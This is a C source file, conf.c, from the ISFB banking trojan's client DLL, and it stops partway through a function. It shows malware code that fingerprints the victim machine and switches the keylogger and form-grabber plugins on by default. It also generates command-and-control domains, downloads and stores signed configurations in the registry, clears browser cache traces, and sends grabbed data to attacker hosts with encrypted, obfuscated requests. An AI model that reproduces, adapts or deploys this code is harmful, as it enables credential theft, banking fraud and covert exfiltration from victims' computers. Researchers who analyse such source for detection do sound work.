//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: conf.c
// $Revision: 433 $
// $Date: 2014-12-05 20:06:34 +0300 (Пт, 05 дек 2014) $
// description:
//	ISFB client DLL. Configuration data manipulation routines.

#include "..\common\common.h"
#include <shlobj.h>

#include "..\crm.h"
#include "..\apdepack\depack.h"
#include "conf.h"
#include "pipes.h"
#include "files.h"
#include "transfer.h"
#include "parser.h"
#include "..\crypto\crypto.h"
#include "..\acdll\activdll.h"
#ifdef _ENABLE_SOCKS
 #include "..\bcclient\bcclient.h"
#endif

#define MAX_CACHE_ENTRY_INFO_SIZE	4096	// bytes
#define	MAX_TEMPLATE_TEXT_SIZE		0x3000	// bytes

#define	MIN_SCRIPT_NAME_LEN			3		// chars
#define	MAX_SCRIPT_NAME_LEN			10		// chars


LONG volatile	g_HostIndex				= 0;		// Current index for the array
LPTSTR			g_Hosts[]				= Hosts;
UCHAR			g_NumberHosts			= (UCHAR)(sizeof(g_Hosts) / sizeof(LPTSTR));
LPTSTR*			g_pHosts				= (LPTSTR*)&g_Hosts;
LPTSTR			g_pHostsString			= NULL;
CRITICAL_SECTION g_HostSelectLock;					// Host select lock

SOCKADDR_IN		g_BcServer				= {0};

CONFIG_DATA		g_ConfigData			= {0};		// Configuration data structure, should be accesse under the lock
CRM_CLIENT_ID	g_ClientId				= {g_Version, 0, {0}};	// Client ID stucture saved within the system registry
LPTSTR			g_ClientIdString		= NULL;
LPTSTR			g_UserNameString		= NULL;
ULONG			g_ServerId				= DEFAULT_SERVER_ID;

LPTSTR			g_ConfigUpdateMutexName	= NULL;		// This mutex should be acquired while updating the config
LPTSTR			g_CommandMutexName		= NULL;		// This mutex should be acquired while updating a version
LPTSTR			g_BcMutexName			= NULL;		// This mutex should be acquired and held by a thread responsable for BC requests
LPTSTR			g_ConfigUpdateTimerName	= NULL;		// Timer to set the config update period
LPTSTR			g_CommandTimerName		= NULL;		// Timer to set the version update period
LPTSTR			g_BcTimerName			= NULL;		// Timer to set BC request period
LPTSTR			g_SolStorageName		= NULL;		// Name of the folder to store SOLs
LPTSTR			g_CommandLogName		= NULL;		// Name of the file containing command log
LPTSTR			g_GrabStorageName		= NULL;		// Name of the file containing grabbed and unsent data
LPTSTR			g_SendTimerName			= NULL;		// Timer to set grabbed data send period
LPTSTR			g_SendMutexName			= NULL;		// This mutex should be acquired while sending a data

ULONG			g_ConfigTimeout			= ConfigCheckTime;
ULONG			g_ConfigFailTimeout		= ConfigFailCheckTime;
ULONG			g_TaskTimeout			= TaskCheckTime;
ULONG			g_SendTimeout			= SendDataTime;
ULONG			g_KnockerTimeout		= KnockerTime;
ULONG			g_BcTimeout				= BcRequestTime;

#ifdef _CHECK_DIGITAL_SIGNATURE
 #ifdef _USE_BUILDER
	PCHAR			g_pPublicKey		= NULL;
 #else
	#include "..\public.key.txt"
	PCHAR			g_pPublicKey		= (PCHAR)&g_PublicKey;
 #endif
#endif	// _CHECK_DIGITAL_SIGNATURE

#if (defined(_ENCRYPT_REQUEST_URI) || defined(_ENCRYPT_SENT_DATA))
PCHAR			g_pServerKey			= SERVER_DEFAULT_KEY;
#endif

// Active state event. Should be set only when program starts any data transmission over the internet 
//	to avoid accessing any site from the blocked process.
HANDLE			g_ActiveEvent = 0;

// Worker thread handles
PWORKER_THREADS g_Workers = NULL;

BOOL LsaDomainNames(LPTSTR *NameList, LPTSTR	Template, LPTSTR	*ZoneList, ULONG ZoneCount,	ULONG Group, ULONG	Season, ULONG NameCount);
BOOL ReceiveCommmand(VOID);
WINERROR CmdGetKeylog(HANDLE hPipe);
WINERROR CmdUnregDll(LPTSTR	pName);

// from vfs.c
WINERROR VfsLoadFile(LPTSTR	FileName, PCHAR* pBuffer, PULONG pSize);
WINERROR VfsSaveFile(LPTSTR	FileName, PCHAR	Buffer, ULONG Size, ULONG Flags);


//
//	Sends the specified command to the pipe server. Receives a data from it and sends the data to the active host.
//
WINERROR GetAndSendData(
	ULONG	CommandId,
	ULONG	SendId,
	ULONG	MaxSize,
	LPTSTR	ErrorData,
	LPSTR	FileName
	)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	HANDLE	hPipe = INVALID_HANDLE_VALUE;
	ULONG	Size = MaxSize;
	PCHAR	pBuffer = NULL;

	ASSERT(CommandId && SendId && MaxSize);

	if (pBuffer = hAlloc(MaxSize))
	{
		if ((Status = PipeGetData(CommandId, pBuffer, &Size)) == NO_ERROR && Size)
			Status = ConfSendData(pBuffer, Size, SendId, FileName, FALSE);
		else
		{
			if (ErrorData)
				Status = ConfSendData(ErrorData, lstrlen(ErrorData), SendId, FileName, FALSE);
		}
		hFree(pBuffer);
	}	// if (pBuffer = hAlloc(MaxSize))
	return(Status);
}


//
//	Requests specified HTML page data using HTTP.
//
WINERROR WINAPI RecvHttpData(
	LPTSTR	szUrl,			// Page URL string
	PCHAR*	PageData,		// Receives pointer to the buffer with the page data	
	PULONG	PageDataSize,	// Receives size of the page data buffer in bytes
	BOOL	bVerify			// Try to decrypt received data and verify it's digital signature
	)
{
	PCHAR	pBuffer;
	ULONG	Size;
	WINERROR Status;

	if ((Status = TransferLoadPage(szUrl, g_UserAgentStr, &pBuffer, &Size)) == NO_ERROR)
	{
#if (defined(_CHECK_DIGITAL_SIGNATURE) && defined(_VERIFY_RECEIVED_DATA))
		if (bVerify && !(Size = VerifyDataSignature(pBuffer, Size, TRUE)))
		{
			hFree(pBuffer);
			Status = ERROR_INVALID_PARAMETER;
		}
		else
#else
		UNREFERENCED_PARAMETER(bVerify);
#endif
		{
			*PageData = pBuffer;
			*PageDataSize = Size;
		}
	}	// if ((Status = TransferLoadPage(szUrl, g_UserAgentStr, &pBuffer, &Size)) == NO_ERROR)

	return(Status);
}


#ifdef _CHECK_DIGITAL_SIGNATURE

//
//	Decrypts the data within the specified buffer and verifies it's digital signature.
//	Returns size of the decrypted data in bytes, or 0 if the verification failed.
//
ULONG VerifyDataSignature(
	PCHAR	Buffer,
	ULONG	Size,
	BOOL	bUnpack
	)
{
	PCHAR	OutBuffer;
	ULONG	bSize = DsUnsign(Buffer, Size, &OutBuffer, g_pPublicKey);

	if (bSize)
	{
		DbgPrint("ISFB_%04x: DS verification succesed.\n", g_CurrentProcessId);
		ASSERT(Size > (bSize + sizeof(CHAR)));
		if (bUnpack)
		{
			memcpy(Buffer, OutBuffer, bSize);
			Buffer[bSize] = 0;
		}
		hFree(OutBuffer);
	}	// if (bSize)
	else
	{
		DbgPrint("ISFB_%04x: DS verification failed.\n", g_CurrentProcessId);
	}

	return(bSize);
}

#endif


//
//	Reads a specified registry value from the program main registry key
//
WINERROR RegReadValue(
	LPTSTR	ValueName,		// Name of the value to read
	PCHAR*	ppBuf,			// Buffer to store read data
	PULONG	pBufSize		// A pointer to a variable that specifies the size of the buffer. 
							//  When the function returns, it contains the size of the data copied to the buffer. 
)
{
	WINERROR	Status = NO_ERROR;
	HKEY		hSubKey;
	ULONG		DataType = 0;
	PCHAR		pBuffer;

	if ((Status = RegOpenKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hSubKey)) == NO_ERROR)
	{
		if ((Status = RegQueryValueEx(hSubKey, ValueName, 0, &DataType, NULL, pBufSize)) == NO_ERROR)
		{
			if (pBuffer = hAlloc(*pBufSize))
			{
				if ((Status = RegQueryValueEx(hSubKey, ValueName, 0, &DataType, pBuffer, pBufSize)) == NO_ERROR)
					*ppBuf = pBuffer;
				else
					hFree(pBuffer);
			}
			else
				Status = ERROR_NOT_ENOUGH_MEMORY;
		}	// if ((Status = RegQueryValueEx(hSubKey, ValueName, 0, &DataType, NULL, pBufSize)) == NO_ERROR)
		RegCloseKey(hSubKey);
	}	// if ((Status = RegOpenKey(hKey, RegPath, &hSubKey)) == NO_ERROR)
	return(Status);
}


//
//	Reads a specified registry value from the spectified registry key
//
WINERROR RegWriteValue(
	LPTSTR	ValueName,		// Name of the value to write
	PCHAR	Buf,			// Buffer containing the data to write
	ULONG	BufSize,		// Size of the buffer in bytes										
	ULONG	Type			// Registry value type
	)
{
	WINERROR	Status = NO_ERROR;
	HKEY		hSubKey;
	ULONG		DataType = 0;

	if ((Status = RegOpenKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hSubKey)) == NO_ERROR)
	{
		if (Buf)
			// Writing data into the key value
			Status = RegSetValueEx(hSubKey, ValueName, 0, Type, Buf, BufSize);
		else
			// Deleting the key value
			Status = RegDeleteValue(hSubKey, ValueName);

		RegCloseKey(hSubKey);
	}
	return(Status);
}



#ifdef	_DYNAMIC_HOSTS

static	LPTSTR	g_Zones[]		= Zones;	// Domain zone names array


//
//	Initializes dynamic list of host names.
//
static BOOL ConfInitHostsList(
	ULONG Seed
	)
{
	BOOL	Ret = FALSE;
	ULONG	DateSeed, Group = (Seed%NUMBER_BOT_GROUPS) + 1;
	ULONG	TempLen = MAX_TEMPLATE_TEXT_SIZE;
	LPTSTR	TempText = NULL;
	CRC32	TempCRC;
	SYSTEMTIME	SysTime;
	WINERROR	Status;
	LPTSTR*	pHosts = NULL;

	do	// not a loop
	{
		if (!(pHosts = hAlloc(NUMBER_HOSTS * sizeof(LPTSTR))))
			break;

		Status = RegReadValue(szDataRegTemplate, &TempText, &TempLen);
		if (Status == NO_ERROR && TempLen)
		{			
			XorDecryptBuffer(TempText, TempLen, Seed, FALSE);
			TempCRC	= ~Crc32(TempText, TempLen);
		}

		if (Status != NO_ERROR || TempCRC != uTemplateCrc)
		{			
			_TCHAR	TempUrl[sizeof(szTemplateUrl)];	// URL should not be a constant string
			memcpy(&TempUrl, szTemplateUrl, sizeof(szTemplateUrl));

			if (TempText)
			{
				hFree(TempText);
				TempText = NULL;
			}

			if (RecvHttpData(TempUrl, &TempText, &TempLen, FALSE) != NO_ERROR)
				break;

			TempLen = StringPackText(TempText, 0, 3);
			
			XorEncryptBuffer(TempText, TempLen, Seed, FALSE);
			RegWriteValue(szDataRegTemplate, TempText, TempLen, REG_BINARY);
			XorDecryptBuffer(TempText, TempLen, Seed, FALSE);
		}
		
		GetSystemTime(&SysTime);
		DateSeed = ((SysTime.wMonth -1)/3) * MOUNTH_SHIFT + SysTime.wYear;
		Ret = LsaDomainNames(pHosts, TempText, (LPTSTR*)&g_Zones, (sizeof(g_Zones)/sizeof(LPTSTR)), Group, DateSeed, NUMBER_HOSTS);
		if (Ret)
		{
			g_pHosts = pHosts;
			g_NumberHosts = NUMBER_HOSTS;
		}
	} while (FALSE);

	if (TempText)
		hFree(TempText);

	return(Ret);
}

//
//	Releases dynamic list of host names.
//
VOID	ConfReleaseHostsList(VOID)
{
	ULONG	i;

	if (g_pHosts != (LPTSTR*)&g_Hosts)
	{
		for (i=0; i<NUMBER_HOSTS; i++)
		{
			if (g_pHosts[i])
				hFree(g_pHosts[i]);
		}
		hFree(g_pHosts);
	}

}

#else

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Initializes static list of host names.
//
static BOOL	ConfInitHostsList(
							ULONG	Seed
							)
{
	BOOL	Ret = TRUE;
	UNREFERENCED_PARAMETER(Seed);
	return(Ret);
}

#endif	// _DYNAMIC_HOSTS


//
//	Selects new valid host index.
//	Initializes dynamic hosts engine.
//
static UCHAR ConfSelectHost(
	UCHAR OldIndex
	)
{
	UCHAR NewIndex = INVALID_INDEX;

	EnterCriticalSection(&g_HostSelectLock);

#ifdef	_DYNAMIC_HOSTS
	if (g_pHosts != (LPTSTR*)&g_Hosts || ConfInitHostsList(g_MachineRandSeed))
#endif
	{
		ASSERT(g_pHosts[0] != NULL);

		if (OldIndex == g_ClientId.HostIndex)
		{
			NewIndex = g_ClientId.HostIndex + 1;
			if (NewIndex >= g_NumberHosts)
				NewIndex = 0;
			SetGroupId(g_ClientId.GroupId, NULL, g_ClientId.Plugins, NewIndex);
		}
		else
			NewIndex = g_ClientId.HostIndex;
	}
	LeaveCriticalSection(&g_HostSelectLock);

	return(NewIndex);
}


//
//	Generates client ID.
//
static VOID GenerateClientId(
	PGUID_EX	pGuidEx
	)
{
	ULONG	Seed;

 #ifdef	_RANDOM_CLIENT_ID
	// Generating random client ID value
	if (CoCreateGuid(&pGuidEx->Guid) != S_OK)
	{
		Seed = GetTickCount();
		GenGuid(&pGuidEx->Guid, &Seed);
	}
 #else	// _RANDOM_CLIENT_ID
	{
		// Generating client ID based on the current machine seed, the current user name and the current computer name
		ULONG	Size = 0;
		LPWSTR	pName;

		Seed = g_MachineRandSeed;
		GenGuid(&pGuidEx->Guid, &Seed);

		GetUserNameW(NULL, &Size);
		if (Size && (pName = hAlloc(Size * sizeof(WCHAR))))
		{
			if (GetUserNameW(pName, &Size))
				pGuidEx->Data1 ^= Crc32((PCHAR)pName, Size * sizeof(WCHAR));
			hFree(pName);
		}

		Size = 0;
		GetComputerNameW(NULL, &Size);
		if (Size && (pName = hAlloc(Size * sizeof(WCHAR))))
		{
			if (GetComputerNameW(pName, &Size))
				pGuidEx->Data4 ^= Crc32((PCHAR)pName, Size * sizeof(WCHAR));
			hFree(pName);
		}

	}	
 #endif	//  #else	// _RANDOM_CLIENT_ID
}


//
//	Loads or creates new CRM_CLIENT_ID global structure.
//
WINERROR GetClientId(VOID)
{
	WINERROR	Status;
	HKEY	hKey;
	ULONG	DataType, Size = sizeof(CRM_CLIENT_ID);
	
#ifdef _USE_BUILDER
	// Saving group ID previously loaded from the INI-file.
	ULONG	GroupId = g_ClientId.GroupId;
#endif

	if ((Status = RegCreateKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hKey)) == NO_ERROR)
	{
		{
			Size = sizeof(CRM_CLIENT_ID);
			// Loading client ID from the registry
			Status = RegQueryValueEx(hKey, szDataRegClientId, NULL, &DataType, (PCHAR)&g_ClientId, &Size);
		}

		if (Status != NO_ERROR || Size != sizeof(CRM_CLIENT_ID))
		{
			// Loading failed, creating new client ID
#ifdef _BC_GENERATE_ID
			BC_MACHINE_ID	SystemId;
			BcCreateSystemId(&SystemId);
			Size = WideCharToMultiByte(CP_UTF8, 0, (LPCWSTR)&SystemId.String, sizeof(BC_MACHINE_ID) / sizeof(WCHAR), (LPSTR)&g_ClientId.UserIdStr, MAX_CLIENT_ID_LEN, NULL, NULL);
			ASSERT(Size);
			g_ClientId.UserIdStr[Size] = 0;
#else
			GenerateClientId(&g_ClientId.UserId);
#endif
#ifdef	_TASK_FROM_EXPLORER
			// Enabling knocker by default
			g_ClientId.Plugins |= PG_BIT_KNOCKER;
#endif
#ifdef  _ENABLE_KEYLOG
			// Enabling keylog by default
			g_ClientId.Plugins |= PG_BIT_KEYLOG;
#endif
			// Enabling HTTP form grabber by default
			g_ClientId.Plugins |= PG_BIT_FORMS;

			Status = RegSetValueEx(hKey, szDataRegClientId, 0, REG_BINARY, (PCHAR)&g_ClientId, sizeof(CRM_CLIENT_ID));
		}	// if (Status != NO_ERROR || Size != sizeof(CRM_CLIENT_ID))
		RegCloseKey(hKey);
	}	// if ((Status = RegCreateKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hKey)) == NO_ERROR)

#ifdef _USE_BUILDER
	if (g_ClientId.GroupId == 0)
		// Restoring group ID loaded from the INI-file
		g_ClientId.GroupId = GroupId;
#endif
	if (g_ClientId.GroupId == 0)
		g_ClientId.GroupId = g_Version;

	if (!g_ClientIdString)
	{
		// Writing current User ID to a string
#ifdef _BC_GENERATE_ID
		if (g_ClientIdString = hAlloc(lstrlen((LPTSTR)&g_ClientId.UserIdStr) + 1))
			lstrcpy(g_ClientIdString, (LPTSTR)&g_ClientId.UserIdStr);
#else
		if (g_ClientIdString = hAlloc((GUID_STR_LEN + 1) * sizeof(_TCHAR)))
			wsprintf(g_ClientIdString, szDwFmt, 
				htonL(g_ClientId.UserId.Data1), 
				htonL(g_ClientId.UserId.Data2), 
				htonL(g_ClientId.UserId.Data3), 
				htonL(g_ClientId.UserId.Data4)
				);
#endif
	}	// if (!g_ClientIdString)

	return(Status);
}


//
//	Sets and saves either the specified numeric or string group ID to the system registry.
//
WINERROR SetGroupId(
	ULONG	uGroupId,	// numeric group ID
	LPTSTR	sGroupId,	// string group ID
	USHORT	Plugins,	// plugins mask
	UCHAR	HostIndex	// active host index
	)
{
	WINERROR Status = ERROR_INVALID_PARAMETER;
	HKEY hKey;

	if (uGroupId == 0)
		uGroupId = StrToInt(sGroupId);

	if (uGroupId)
	{
		if ((Status = RegOpenKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hKey)) == NO_ERROR)
		{
			g_ClientId.GroupId = uGroupId;
			g_ClientId.Plugins = Plugins;
			g_ClientId.HostIndex = HostIndex;

			Status = RegSetValueEx(hKey, szDataRegClientId, 0, REG_BINARY, (PCHAR)&g_ClientId, sizeof(CRM_CLIENT_ID));

			RegCloseKey(hKey);
		}	// if ((uGroupId) && (RegOpenKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hKey) == NO_ERROR))
	}	// if (uGroupId)

	return(Status);
}



/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Deletes specified URL entry from browser's content entry cache.
//  In case of error returns FALSE, call GetLastError() for extended information.
//
BOOL NetClearCacheURL(
				IN	LPTSTR Str	// String specifies the URL to delete
				)
{
	BOOL Ret = FALSE;
	LPINTERNET_CACHE_ENTRY_INFO pEntryInfo;
	ULONG bSize = MAX_CACHE_ENTRY_INFO_SIZE;
	HANDLE	hFind;

	if (pEntryInfo = (LPINTERNET_CACHE_ENTRY_INFO)hAlloc(bSize))
	{
		if (hFind = FindFirstUrlCacheEntry(NULL, pEntryInfo, &bSize))
		{
			Ret = TRUE;
			do 
			{
				if (StrStrI(pEntryInfo->lpszSourceUrlName, Str))				
					DeleteUrlCacheEntry(pEntryInfo->lpszSourceUrlName);
				
				bSize = MAX_CACHE_ENTRY_INFO_SIZE;
			} while(FindNextUrlCacheEntry(hFind, pEntryInfo, &bSize));

			FindCloseUrlCache(hFind);
		}	// if (hFind = 
		hFree(pEntryInfo);
	}	// if (pEntryInfo = 
	return(Ret);
}


CRC32 GetConfigCRC(VOID)
{
	CRC32	ConfigCRC = 0;
	ConfigLockShared(&g_ConfigData);
	if (g_ConfigData.UnpackedData)
		ConfigCRC = g_ConfigData.FileCRC;
	ConfigUnlockShared(&g_ConfigData);
	return(ConfigCRC);
}


//
//	Scans config data for file masks to find and initializes file search.
//
VOID FindFiles(
	PCHAR pData
	 )
{
	PCHAR	s[6];
	ULONG	l[6];
	ULONG	i = 0;
	PCHAR	cData = pData;

	do 
	{
		for (i=0; i<6; i++)
		{
			s[i] = cData + sizeof(ULONG);
			l[i] = *(ULONG*)cData; 
			cData = s[i]+l[i];
		}

		if (l[0] < 1)
			break;

		if (l[1] > 1)
		{
			if ((Crc32(s[1], l[1] - 1) ^ g_CsCookie) == CRC_FILE)
				PipeSendCommand(CMD_FINDFILES, s[0], l[0], NULL);
/*
			if (_tcsicmp((LPTSTR)s[1], szTargetHidden) == 0)
			{
				ShellExecute(0, szOpen, szOpenIe, (LPTSTR)s[0], NULL, SW_SHOWNORMAL);
				Sleep(25000);
			// TODO: there's a large part of code commented, why?
			}
*/
		}
	}while (TRUE);
}



//
//	Validates specified config data by unpacking and comparing it's checksum. 
//	Writes the config data to the registry if validation successed.
//
static BOOL SavePackedConfig(
	PCHAR	Buf,	// Data buffer
	ULONG	BufLen	// Size of the data buffer in bytes
	)
{
	BOOL	Ret = FALSE;
	if (BufLen > 8)
	{
		// Data in the buffer looks like:
		//struct {
		//	ULONG	UnpackedSize;										// Size in bytes of the unpacked data
		//	PCHAR	PackedData[BufLen-(sizeof(ULONG)+sizeof(CRC32))];	// Packed data
		//	CRC32	PackedCRC;											// CRC32 of the packed data
		//}

		PCHAR OriginalData;
		PCHAR PackedData =		Buf + sizeof(ULONG);
		ULONG PackedSize =		BufLen - (sizeof(ULONG) + sizeof(CRC32));

		if (OriginalData = hAlloc(BufLen))
		{
#ifndef _CHECK_DIGITAL_SIGNATURE
			CRC32 PackedCRC, RealCRC;
#endif
			// Copying content of the buffer so we could modify (decrypt) it later.
			memcpy(OriginalData, Buf, BufLen);

#ifdef _CHECK_DIGITAL_SIGNATURE
			if (VerifyDataSignature(Buf, BufLen, TRUE))
#else
			PackedCRC = *(CRC32*)(PackedData + PackedSize);
			// TODO: possible bug here, coz PackedCRC doesn't cover UnpackedSize field.
			RealCRC =  ~Crc32(PackedData, PackedSize);

			if (RealCRC == PackedCRC)
#endif
			{
				ULONG UnpackedSize = *(ULONG*)Buf;
				PCHAR UnpackedData = (PCHAR)hAlloc(UnpackedSize + 16);
				if (UnpackedData)
				{
					ULONG RealSize = aP_depack(PackedData, UnpackedData);
					if (RealSize == UnpackedSize)
					{					
						// Saving packed data as it is
						if (RegWriteValue(szDataRegDataValue, OriginalData, BufLen, REG_BINARY) == NO_ERROR)
							Ret = TRUE;
						else
						{
							DbgPrint("ISFB_%04x: Failed writing config to the registry.\n", g_CurrentProcessId);
						}
						FindFiles(UnpackedData);
					}
					hFree(UnpackedData);
				}	// if (UnpackedData)
			}	// if (RealCRC == PackedCRC)
			else
			{
				// Invalid config file or signature verification failed.
				// Switch to an other server.
				ConfSelectHost(g_ClientId.HostIndex);
			}

			hFree(OriginalData);
		}	// if (OriginalData = hAlloc(BufLen))
	}	// if (BufLen > 8)

	return(Ret);
}


//
//	Allocates and returns a string of the specified length containing random characters between 'a' and 'z' inclusively.
//
static LPTSTR GetRandomString(
	ULONG Length
	)
{
	LPTSTR	RndStr;
	ULONG	i, Seed = GetTickCount();

	if (RndStr = hAlloc((Length + 1) * sizeof(_TCHAR)))
	{
		for (i=0; i<Length; i++)
			RndStr[i] = (_TCHAR)(LsaRandom(&Seed)%('z'-'a')) + 'a';
		RndStr[i] = 0;
	}

	return(RndStr);
}


//
//	Queries the Active Host for a new config or task data depending on the specified request URI.
//
WINERROR ConfRequestData(
	LPTSTR	pRequestUri,	// Uri to send request to
	ULONG	Crc,			// CRC parameter for the request
	BOOL	bPost,			// Send POST request, otherwise GET is being sent
	PCHAR	pSendBuffer,	// buffer containing data to send with the request
	ULONG	SendSize,		// size of the send buffer in bytes
	PCHAR*	pBuffer,		// Pointer to a variable that receives a buffer with data
	PULONG	pSize			// Pointer to a variable that receives a size of the buffer
	)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	PCHAR		pUrl, pUri;
	LPTSTR		ScriptName, ParamStr;

	if (pUri = hAlloc(MAX_URL_LEN * sizeof(_TCHAR)))
	{
		ULONG szRequestFmtLen = cstrlen(szRequestFmt);

		if (Crc == 0)
			Crc = GetTickCount();

		wsprintf(pUri, 
#ifdef _BC_GENERATE_ID
			szRequestFmtStr,
			g_BuildNumber,
			(LPSTR)&g_ClientId.UserIdStr,
#else
			szRequestFmt,
			g_BuildNumber,
			htonL(g_ClientId.UserId.Data1), 
			htonL(g_ClientId.UserId.Data2), 
			htonL(g_ClientId.UserId.Data3), 
			htonL(g_ClientId.UserId.Data4), 
#endif
			g_ServerId, 
			g_ClientId.GroupId, 
			Crc
			);

		if (pUrl = hAlloc(MAX_URL_LEN * sizeof(_TCHAR)))
		{
#ifdef _ENCRYPT_REQUEST_URI
			RsaRandom(GetTickCount());

			if (ScriptName = GenScriptLine(pRequestUri))
			{
				if (ParamStr = ObfuscateParamStr(pUri, (PRC6_KEY)g_pServerKey))
				{
					StrTrim(ParamStr, "\r\n");
#else
					ScriptName = pRequestUri;
					ParamStr = pUri;
#endif
					lstrcpy(pUrl, g_pHosts[g_ClientId.HostIndex]);
					lstrcat(pUrl, ScriptName);
					lstrcat(pUrl, ParamStr);
				
					NetClearCacheURL(g_pHosts[g_ClientId.HostIndex]);

					Status = TransferLoadPageEx(pUrl, g_UserAgentStr, bPost, pSendBuffer, SendSize, pBuffer, pSize);

					if (Status != NO_ERROR && Status != ERROR_EMPTY)
						ConfSelectHost(g_ClientId.HostIndex);
#ifdef _ENCRYPT_REQUEST_URI
					hFree(ParamStr);
				}
				hFree(ScriptName);
			}
#endif
			hFree(pUrl);
		}
		hFree(pUri);
	}	// if (pUrl = hAlloc(MAX_URL_LEN * sizeof(_TCHAR)))

	return(Status);
}


//
//	Queries the Active Host for a new config or task data depending on the specified request URI.
//
WINERROR ConfSendData(
	PCHAR	pSendBuffer,	// buffer containing data to send with the request
	ULONG	SendSize,		// size of the send buffer in bytes
	ULONG	DataId,			// ID for the data to send
	LPTSTR	pFileName,		// name of a file to send
	BOOL	bWait			// TRUE to wait until send completes
	)
{
	WINERROR	Status = WSAHOST_NOT_FOUND;
	PCHAR		pUrl, pUri;
	LPTSTR		ScriptName, ParamStr, pName = szForm;

	Status = ERROR_NOT_ENOUGH_MEMORY;

	if (pUri = hAlloc(MAX_URL_LEN * sizeof(_TCHAR)))
	{
		if (pFileName)
			pName = pFileName;

		wsprintf(pUri, 
#ifdef _BC_GENERATE_ID
			szPostFmtStr,
			g_BuildNumber, 
			(LPSTR)&g_ClientId.UserIdStr,
#else
			szPostFmt,
			g_BuildNumber, 
			htonL(g_ClientId.UserId.Data1), 
			htonL(g_ClientId.UserId.Data2), 
			htonL(g_ClientId.UserId.Data3), 
			htonL(g_ClientId.UserId.Data4), 
#endif
			g_ServerId, 
			g_ClientId.GroupId, 
			DataId, 
			pName
			);

		if (pUrl = hAlloc(MAX_URL_LEN * sizeof(_TCHAR)))
		{
#ifdef _ENCRYPT_REQUEST_URI
			if (ScriptName = GenScriptLine(g_DataURL))
			{
				if (ParamStr = ObfuscateParamStr(pUri, (PRC6_KEY)g_pServerKey))
				{
					StrTrim(ParamStr, "\r\n");
#else
					ScriptName = g_DataURL;
					ParamStr = pUri;
#endif
					lstrcpy(pUrl, g_pHosts[g_ClientId.HostIndex]);
					lstrcat(pUrl, ScriptName);
					lstrcat(pUrl, ParamStr);

#ifdef _ENCRYPT_SENT_DATA
					{
						PCHAR	pEncrypted;
						ULONG	EncSize;

						// Encrypting send data buffer with the server key
						Status = RC6EncryptDecryptBuffer(pSendBuffer, SendSize, &pEncrypted, &EncSize,  (PRC6_KEY)g_pServerKey, TRUE);
						if (Status == NO_ERROR)
						{
							ASSERT(EncSize);

							// Sending encrypted data to the server
							Status = TransferSendData(pUrl, pEncrypted, EncSize, g_UserAgentStr, pName, bWait);
							hFree(pEncrypted);
						}
					}
#else
					Status = TransferSendData(pUrl, pSendBuffer, SendSize, g_UserAgentStr, pName, bWait);
#endif
					if (Status != NO_ERROR)
						ConfSelectHost(g_ClientId.HostIndex);
#ifdef _ENCRYPT_REQUEST_URI
					hFree(ParamStr);
				}
				hFree(ScriptName);
			}
#endif
			hFree(pUrl);
		}
		hFree(pUri);
	}	// if (pUrl = hAlloc(MAX_URL_LEN * sizeof(_TCHAR)))

	return(Status);
}



//
//	Queries the Active Host for a new config. 
//
static BOOL UpdateConfig(CRC32 ConfigCRC)
{
	BOOL	Ret = FALSE;
	PCHAR	Buffer;
	ULONG	Size = 0;
	WINERROR	Status;

	if ((Status = ConfRequestData(g_ConfigURL, ConfigCRC, FALSE, NULL, 0, &Buffer, &Size)) == NO_ERROR)
	{
		ASSERT(Size);
		DbgPrint("ISFB_%04x: Config of %u bytes loaded.\n", g_CurrentProcessId, Size);
		if (Ret = SavePackedConfig(Buffer, Size))
		{
			DbgPrint("ISFB_%04x: Config successfully updated.\n", g_CurrentProcessId);
		}
		hFree(Buffer);
	}
	else
	{
		DbgPrint("ISFB_%04x: Config request failed with status %u.\n", g_CurrentProcessId, Status);
	}

	return(Ret);
}


//
//	Validates the specified config data buffer and attemps to renew g_ConfigData. 
//	Returns TRUE if the specifed config data valid.
//
static BOOL ProcessPackedConfig(
	PCHAR	Buf,	// Data buffer
	ULONG	BufLen	// Size of the data buffer in bytes
	)
{
	BOOL Ret = FALSE;

	if (BufLen > 8)
	{
		// Data in the buffer looks like:
		//struct {
		//	ULONG	UnpackedSize;										// Size in bytes of the unpacked data
		//	PCHAR	PackedData[BufLen-(sizeof(ULONG)+sizeof(CRC32))];	// Packed data
		//	CRC32	PackedCRC;											// CRC32 of the packed data
		//}
		PCHAR	PackedData = Buf + sizeof(ULONG);
		ULONG	PackedSize = BufLen - (sizeof(ULONG) + sizeof(CRC32));
		CRC32	FileCRC = ~Crc32(Buf, BufLen);

#ifdef _CHECK_DIGITAL_SIGNATURE
		if (VerifyDataSignature(Buf, BufLen, TRUE))
#else
		CRC32 PackedCRC = *(CRC32*)(PackedData + PackedSize);
		// TODO: possible bug here, coz PackedCRC doesn't cover UnpackedSize field.
		CRC32 RealCRC =	~Crc32(PackedData, PackedSize);

		if (RealCRC == PackedCRC)
#endif
		{
			ULONG	UnpackedSize = *(ULONG*)Buf;
			PCHAR	UnpackedData = (PCHAR)hAlloc(UnpackedSize + 16);
			if (UnpackedData)
			{
				ULONG	RealSize = aP_depack(PackedData, UnpackedData);

				ConfigLockExclusive(&g_ConfigData);
				if (RealSize == UnpackedSize && g_ConfigData.FileCRC != FileCRC)
				{
					if (g_ConfigData.UnpackedData)
						hFree(g_ConfigData.UnpackedData);
					g_ConfigData.UnpackedData = UnpackedData;				
					g_ConfigData.FileCRC = FileCRC;
					DbgPrint("ISFB_%04x: Config loaded from the registry.\n", GetCurrentProcessId());
				}
				else
					hFree(UnpackedData);
				Ret = TRUE;
				ConfigUnlockExclusive(&g_ConfigData);
			}	// if (UnpackedData)
		}	// if (RealCRC == PackedCRC)
	}	// if (BufLen > 8)

	return(Ret);
}

//
//	Verifies format of the specified config.
//	Returns TRUE if the format is valid or FALSE otherwise.
//
BOOL VerifyConfig(
	PCHAR	pBuffer,	// buffer containing unpacked and decrypted config data
	ULONG	Size		// size of the buffer in bytes
	)
{
	PCHAR	eData, cData, s[6];
	ULONG	l[6], i;
	BOOL	Ret = TRUE;

